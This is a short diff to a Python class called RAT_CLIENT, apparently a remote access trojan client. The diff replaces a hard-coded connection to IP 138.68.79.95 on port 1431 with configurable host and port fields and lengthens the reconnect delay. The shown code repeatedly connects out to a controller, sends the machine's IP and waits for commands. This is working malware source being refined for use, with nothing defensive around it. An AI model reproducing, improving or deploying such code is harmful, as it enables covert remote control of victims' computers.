@@ -46,8 +46,7 @@ class RAT_CLIENT:
         while not connected:  
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect(('138.68.79.95', 1431)) ##
-                print (s)
+                s.connect((self.host, self.port)) ##
                 sending = socket.gethostbyname(socket.gethostname())
                 s.send(sending.encode())
                 command = s.recv(1024).decode()
@@ -56,7 +55,7 @@ class RAT_CLIENT:
                     print("Connect Establish")
             except socket.error as e:
                 print("Attempting to connect...")
-                time.sleep(10)
+                time.sleep(50)
             
     
     def errorsend(self):
